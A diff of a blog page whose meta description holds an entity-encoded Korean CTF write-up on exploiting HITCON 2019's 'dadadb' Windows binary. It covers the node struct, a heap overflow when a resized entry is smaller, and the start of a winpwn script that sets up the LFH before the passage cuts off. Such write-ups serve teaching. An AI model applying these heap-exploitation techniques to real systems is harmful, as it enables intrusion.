@@ -13,7 +13,308 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h1 id=&#34;&amp;#xC774;&amp;#xC804;-&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&#34;&gt;&lt;a href=&#34;#&amp;#xC774;&amp;#xC804;-&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC774;&amp;#xC804; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&#34;&gt;&lt;/a&gt;&amp;#xC774;&amp;#xC804; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/&#34;&gt;Pwn&amp;#xD558;&amp;#xACE0; Cool&amp;#xD558;&amp;#xACE0; Sexy&amp;#xD55C; Windows &amp;#xD0D0;&amp;#xBC29;&amp;#xAE30; Part 1 - pwntools for windows&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/&#34;&gt;Pwn&amp;#xD558;&amp;#xACE0; Cool&amp;#xD558;&amp;#xACE0; Sexy&amp;#xD55C; Windows &amp;#xD0D0;&amp;#xBC29;&amp;#xAE30; Part 2 - NT Heap&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/&#34;&gt;Pwn&amp;#xD558;&amp;#xACE0; Cool&amp;#xD558;&amp;#xACE0; Sexy&amp;#xD55C; Windows &amp;#xD0D0;&amp;#xBC29;&amp;#xAE30; Part 3 - NT Heap(2)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;p&gt;&amp;#xBC8C;&amp;#xC368; &amp;#xBE14;&amp;#xB85C;&amp;#xADF8; &amp;#xC624;&amp;#xD508;&amp;#xD55C;&amp;#xC9C0; &amp;#xBC18;&amp;#xB144;&amp;#xC774; &amp;#xB418;&amp;#xB294; 4&amp;#xC6D4;&amp;#xC774;&amp;#xB124;&amp;#xC694;!  &lt;del&gt;&lt;em&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB2E4;&amp;#xC74C;&amp;#xC8FC;&amp;#xBA74; &amp;#xC911;&amp;#xAC04;&amp;#xACE0;&amp;#xC0AC;&amp;#xB78D;&amp;#xB2C8;&amp;#xB2E4; &amp;#xD751;&amp;#x314E;&amp;#xADF8; &amp;#x3160;&amp;#x3160;&lt;/em&gt;&lt;/del&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled.png&#34; alt=&#34;pwncoolsexy-part4/Untitled.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;#xB098;.. &amp;#xC878;&amp;#xC5C5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xAE4C;..?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xC2DC;&amp;#xD5D8;&amp;#xAE30;&amp;#xAC04;&amp;#xC5D0;&amp;#xB294; &amp;#xC5ED;&amp;#xC2DC; &amp;#xB534; &amp;#xAC70; &amp;#xD558;&amp;#xB294; &amp;#xAC8C; &amp;#xC81C;&amp;#xC77C; &amp;#xC7AC;&amp;#xBC0C;&amp;#xC8E0;. &amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB294; &amp;#xC2DC;&amp;#xD5D8;&amp;#xAE30;&amp;#xAC04; &amp;#xBC84;&amp;#xD504;&amp;#xB97C; &amp;#xBC1B;&amp;#xC544; &amp;#xC81C;&amp;#xC77C; &amp;#xC7AC;&amp;#xBC0C;&amp;#xAC8C; &amp;#xC791;&amp;#xC131;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;; (&amp;#xD559;&amp;#xC810;&amp;#xACFC; &amp;#xB4F1;&amp;#xAC00; &amp;#xAD50;&amp;#xD658;&amp;#xD55C; &amp;#xAC74; &amp;#xB364;) &amp;#xC624;&amp;#xB298;&amp;#xC740; HITCON 2019 Quals&amp;#xC5D0; &amp;#xCD9C;&amp;#xC81C;&amp;#xB41C; Windows pwnable &amp;#xBB38;&amp;#xC81C;&amp;#xC778; dadadb&amp;#xB97C; &amp;#xD480;&amp;#xC5B4;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; NT Heap&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; exploitation&amp;#xC744; &amp;#xC790;&amp;#xC138;&amp;#xD558;&amp;#xAC8C; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;h1 id=&#34;Environment&#34;&gt;&lt;a href=&#34;#Environment&#34; class=&#34;headerlink&#34; title=&#34;Environment&#34;&gt;&lt;/a&gt;Environment&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;Windows x64 on windows sever 2019&lt;ul&gt;
+&lt;li&gt;Similar to Windows 10 (1809)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;AppJailLauncher&lt;/li&gt;
+&lt;li&gt;DEP&lt;/li&gt;
+&lt;li&gt;ASLR&lt;/li&gt;
+&lt;li&gt;CFG&lt;/li&gt;
+&lt;li&gt;&amp;#xC790;&amp;#xC2DD; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xC0DD;&amp;#xC131; &amp;#xBD88;&amp;#xAC00;&lt;ul&gt;
+&lt;li&gt;&amp;#xC0C8; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xC0DD;&amp;#xC131; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Private Heap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Windows 1809 (&amp;#xBE4C;&amp;#xB4DC; 17763.1) &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;p&gt;&amp;#xC5EC;&amp;#xB2F4;&amp;#xC73C;&amp;#xB85C;.. Windows10 1809 &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; Windows Terminal &amp;#xC9C0;&amp;#xC6D0;&amp;#xC774; &amp;#xC548;&amp;#xB3FC; &amp;#xB208;&amp;#xBB3C;&amp;#xC744; &amp;#xBA38;&amp;#xAE08;&amp;#xACE0; winpwn&amp;#xC758; &amp;#xD3F0;&amp;#xD2B8; &amp;#xC2A4;&amp;#xD0C0;&amp;#xC77C;&amp;#xC744; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xB2E4;&amp;#xB978; &amp;#xD130;&amp;#xBBF8;&amp;#xB110;&amp;#xC744; &amp;#xC4F8; &amp;#xC218; &amp;#xBC16;&amp;#xC5D0; &amp;#xC5C6;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;;; &amp;#xD574;&amp;#xD0B9;&amp;#xD560; &amp;#xB550; &amp;#xBAA8;&amp;#xB2C8;&amp;#xD130;&amp;#xAC00; &amp;#xD654;&amp;#xB824;&amp;#xD574;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xB370;.. &amp;#xADF8;&amp;#xB7FC; &amp;#xC775;&amp;#xC2A4; &amp;#xC548;&amp;#xB418;&amp;#xB358; &amp;#xAC83;&amp;#xB3C4; &amp;#xB418;&amp;#xB294;&amp;#xAC70; &amp;#x3147;&amp;#x3148;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%201.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%201.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;&amp;#xC8FC;&amp;#xC758;&lt;/strong&gt; &amp;#xAC89;&amp;#xBA4B;&amp;#xB9CC; &amp;#xB4E4;&amp;#xBA74; &amp;#xB9DD;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xC81C; &amp;#xC598;&amp;#xAE30;&amp;#xB124;&amp;#xC694; &amp;#x314E;&amp;#x314E;.. &amp;#xC544;&amp;#xBB34;&amp;#xD2BC;, &amp;#xBB38;&amp;#xC81C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xCC2C;&amp;#xCC2C;&amp;#xD788; &amp;#xB72F;&amp;#xC5B4;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xC2DC;&amp;#xC791;&amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;h1 id=&#34;Analysis&#34;&gt;&lt;a href=&#34;#Analysis&#34; class=&#34;headerlink&#34; title=&#34;Analysis&#34;&gt;&lt;/a&gt;Analysis&lt;/h1&gt;&lt;p&gt;&amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xB2E4;&amp;#xB978; &amp;#xC124;&amp;#xBA85; &amp;#xC5C6;&amp;#xC774; &amp;#xC785;&amp;#xB825;&amp;#xC744; &amp;#xBC1B;&amp;#xB294;&amp;#xB370;, 1&amp;#xBC88;&amp;#xC73C;&amp;#xB85C; &amp;#xB85C;&amp;#xADF8;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%202.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%202.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;user.txt&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xC5EC;&amp;#xB7EC; &amp;#xACC4;&amp;#xC815;&amp;#xACFC; &amp;#xD328;&amp;#xC2A4;&amp;#xC6CC;&amp;#xB4DC; &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xB85C; &amp;#xB85C;&amp;#xADF8;&amp;#xC778;&amp;#xD558;&amp;#xBA74; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; DB &amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xAD6C;&amp;#xD604;&amp;#xB41C; &amp;#xAC78; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%203.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%203.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;user.txt&amp;#xC758; &amp;#xACC4;&amp;#xC815;&amp;#xACFC; &amp;#xD328;&amp;#xC2A4;&amp;#xC6CC;&amp;#xB4DC;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;#xB85C;&amp;#xADF8;&amp;#xC778;&amp;#xD55C; &amp;#xC774;&amp;#xD6C4; &amp;#xBA54;&amp;#xB274;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;add&lt;ul&gt;
+&lt;li&gt;key, size, data&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC544; &amp;#xB178;&amp;#xB4DC; &amp;#xCD94;&amp;#xAC00;&lt;/li&gt;
+&lt;li&gt;node list&amp;#xC5D0; key&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; key&amp;#xC758; data &amp;#xC218;&amp;#xC815;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;view&lt;ul&gt;
+&lt;li&gt;key&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC544; &amp;#xB178;&amp;#xB4DC; &amp;#xAC80;&amp;#xC0C9; &amp;#xD6C4; key&amp;#xC640; data &amp;#xCD9C;&amp;#xB825;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;delete&lt;ul&gt;
+&lt;li&gt;key&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC544; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xB178;&amp;#xB4DC; &amp;#xC0AD;&amp;#xC81C;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;logout&lt;ul&gt;
+&lt;li&gt;&amp;#xB85C;&amp;#xADF8;&amp;#xC544;&amp;#xC6C3;&amp;#xD558;&amp;#xACE0; &amp;#xB85C;&amp;#xADF8;&amp;#xC778; &amp;#xC804;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xAC10;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xB9CE;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xC774; &amp;#xC815;&amp;#xB3C4;&amp;#xB85C;&amp;#xB9CC; &amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xBD80;&amp;#xD130; &amp;#xCC3E;&amp;#xC544;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
+&lt;h1 id=&#34;Vulnerability&#34;&gt;&lt;a href=&#34;#Vulnerability&#34; class=&#34;headerlink&#34; title=&#34;Vulnerability&#34;&gt;&lt;/a&gt;Vulnerability&lt;/h1&gt;&lt;p&gt;&amp;#xC6B0;&amp;#xC120; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC778; &lt;code&gt;node&lt;/code&gt; &amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC73C;&amp;#xBA70; 256&amp;#xAC1C;&amp;#xC758; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xBC30;&amp;#xC5F4;&amp;#xB85C; &amp;#xC120;&amp;#xC5B8;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%204.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%204.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;node&lt;/span&gt;{&lt;/span&gt;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* data;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;size_t&lt;/span&gt; size;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; key[&lt;span class=&#34;hljs-number&#34;&gt;41&lt;/span&gt;];
+	&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;node&lt;/span&gt;* &lt;span class=&#34;hljs-title&#34;&gt;next&lt;/span&gt;;&lt;/span&gt;
+}
+
+&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;node&lt;/span&gt;* &lt;span class=&#34;hljs-title&#34;&gt;list&lt;/span&gt;[256];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;main()&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;user.txt&lt;/code&gt; &amp;#xC758; &amp;#xACC4;&amp;#xC815;&amp;#xC73C;&amp;#xB85C; &amp;#xB85C;&amp;#xADF8;&amp;#xC778; &amp;#xC258;&amp;#xC744; &amp;#xC5BB;&amp;#xC740; &amp;#xC774;&amp;#xD6C4;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%205.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xC911; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; node&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xB294; &lt;code&gt;add_sub_1340()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%206.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%206.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;add_sub_1340()&lt;/code&gt;&amp;#xC758; node&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Key&lt;/code&gt;&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xACE0; &amp;#xBE68;&amp;#xAC04; &amp;#xBC15;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xD604;&amp;#xC7AC; node list&amp;#xC5D0; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC740; &lt;code&gt;Key&lt;/code&gt;&amp;#xAC12;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0C9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&amp;#xB9CC;&amp;#xC57D; &amp;#xBABB; &amp;#xCC3E;&amp;#xC558;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;LABEL_13&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC810;&amp;#xD504;&amp;#xD574; &amp;#xC0C8; node&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xCC3E;&amp;#xC558;&amp;#xB2E4;&amp;#xBA74; &amp;#xC544;&amp;#xB798; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;ul&gt;
+&lt;li&gt;&amp;#xCC3E;&amp;#xC740; &amp;#xACBD;&amp;#xC6B0; linked list&amp;#xC758; head&amp;#xC5D0; &amp;#xC0C8; node&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. (node[2] &amp;#x2192; node[1] &amp;#x2192; node[0]&amp;#x2026;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC740; Key&amp;#xAC12;&amp;#xC774; &amp;#xC774;&amp;#xBBF8; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xB97C; &amp;#xC880; &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xBCFC;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%207.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%207.png&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;#xC77C;&amp;#xCE58;&amp;#xD558;&amp;#xB294; &lt;code&gt;Key&lt;/code&gt;&amp;#xAC12;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;&amp;#xB97C; &amp;#xCC3E;&amp;#xC558;&amp;#xC73C;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &lt;code&gt;node&amp;#x2192;data&lt;/code&gt;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xACE0; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xB97C; &lt;code&gt;new_size&lt;/code&gt;&amp;#xC5D0; &amp;#xC0C8;&amp;#xB85C; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;new_size&lt;/code&gt;&amp;#xC758; &amp;#xCD5C;&amp;#xB313;&amp;#xAC12;&amp;#xC744; &lt;code&gt;0x1000&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC81C;&amp;#xD55C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;new_size&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &lt;code&gt;node&amp;#x2192;data&lt;/code&gt;&amp;#xC5D0; &amp;#xC0C8;&amp;#xB85C; Heap&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;new_size&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xC0C8;&amp;#xB85C; &amp;#xD560;&amp;#xB2F9;&amp;#xD55C; &lt;code&gt;node&amp;#x2192;data&lt;/code&gt;&amp;#xC5D0; &amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &lt;code&gt;node&amp;#x2192;data&lt;/code&gt;&amp;#xC758; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xC778; &lt;code&gt;old_size&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xC785;&amp;#xB825;&amp;#xC744; &amp;#xBC1B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;new_size&lt;/code&gt;&amp;#xAC00; &lt;code&gt;old_size&lt;/code&gt;&amp;#xBCF4;&amp;#xB2E4; &amp;#xC791;&amp;#xC73C;&amp;#xBA74; Heap buffer overflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;Leak-Address&#34;&gt;&lt;a href=&#34;#Leak-Address&#34; class=&#34;headerlink&#34; title=&#34;Leak Address&#34;&gt;&lt;/a&gt;Leak Address&lt;/h1&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; Heap overflow&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; Heap &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; leak &amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC624;&amp;#xB298;&amp;#xC740; LFH&amp;#xB97C; &amp;#xB2E4;&amp;#xB8F0; &amp;#xAC83;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; LFH&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB41C; chunk&amp;#xC5D0;&amp;#xC11C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%208.png&#34; alt=&#34;pwncoolsexy-part4/Untitled%208.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;node&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xB2E4; &amp;#xBCF4;&amp;#xBA74; 19&amp;#xBC88;&amp;#xC9F8;&amp;#xC5D0;&amp;#xC11C; LFH &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; node&amp;#xB97C; &amp;#xC138; &amp;#xAC1C;&amp;#xB9CC; &amp;#xCD94;&amp;#xAC00;&amp;#xD574;&amp;#xC11C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; winpwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+
+&lt;span class=&#34;hljs-comment&#34;&gt;#...&lt;/span&gt;
+
+p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./dadadb.exe&amp;quot;&lt;/span&gt;)
+
+login(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)
+&lt;span class=&#34;hljs-comment&#34;&gt;## enable LFH&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;):
+	add(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;l0ch&amp;quot;&lt;/span&gt;+str(i),&lt;span class=&#34;hljs-number&#34;&gt;0x90&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;BBBB&amp;quot;&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;## fill userblock&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;):
